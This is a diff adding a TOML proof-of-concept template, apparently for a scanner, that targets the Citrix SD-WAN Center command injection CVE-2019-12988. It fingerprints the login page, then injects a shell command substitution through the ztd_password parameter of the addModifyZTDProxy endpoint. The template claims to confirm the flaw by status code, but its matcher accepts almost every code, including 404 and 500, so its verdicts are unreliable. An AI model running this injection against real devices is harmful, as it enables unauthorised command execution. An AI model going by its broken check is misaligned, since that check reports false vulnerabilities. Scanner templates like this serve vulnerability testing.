@@ -1,0 +1,53 @@
+[info]
+author = "AVE"
+description = "通过向 /Collector/nms/addModifyZTDProxy 接口的 ztd_password 参数注入恶意命令，验证 Citrix SD-WAN Center 命令注入漏洞（CVE-2019-12988）。先访问 /login 确认目标为 Citrix SD-WAN 设备，再发送包含命令注入 payload 的请求，通过状态码确认漏洞存在。"
+id = "POC-AVE-2019-0061"
+name = "Citrix SD-WAN Center 命令注入漏洞 PoC"
+severity = "critical"
+tags = ["ave-2019-0061"]
+vuln_id = [
+    "CVE-2019-12988",
+    "AVE-2019-0061",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<title>Citrix SD-WAN</title>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/Collector/nms/addModifyZTDProxy?ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(id)"
+protocol = "http"
+unsafe = true
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+    202,
+    204,
+    301,
+    302,
+    303,
+    307,
+    400,
+    401,
+    403,
+    404,
+    405,
+    500,
+    502,
+    503,
+]
+type = "status"
